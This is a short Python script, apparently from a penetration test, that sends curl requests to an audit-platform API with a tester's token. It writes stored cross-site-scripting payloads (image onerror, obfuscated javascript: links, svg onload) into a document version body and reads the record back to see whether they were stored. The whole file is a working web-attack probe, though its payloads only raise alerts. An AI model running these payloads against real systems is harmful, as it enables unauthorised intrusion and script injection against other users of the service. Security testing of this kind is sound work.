import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXB'+uuid.uuid4().hex[:5]
print("=== can Tester write a document body? (narrative 31 / docver 1371) ===")
pays=[
 ('img',      f'<img src=x onerror=alert(document.domain)>{tag}'),
 ('a-pct',    f'<a href="javas%63ript:alert(document.domain)">{tag}</a>'),
 ('a-entity', f'<a href="javascript&colon;alert(document.domain)">{tag}</a>'),
 ('svg',      f'<svg onload=alert(1)>{tag}</svg>'),
]
for label,pay in pays:
    for shape in [{"document_version":{"body":pay}},
                  {"document_version":{"body":pay,"flat_body":pay}}]:
        c,b=req('PUT','/api/v1/document_versions/1371',shape)
        if c=='200':
            c2,b2=req('GET','/api/v1/document_versions/1371')
            st=json.loads(b2)['document_versions'][0]
            print(f"  {label:10} {list(shape['document_version'].keys())} -> 200")
            print(f"      stored={str(st.get('body'))[:120]!r}")
            break
    else:
        print(f"  {label:10} -> {c} {b[:80]}")
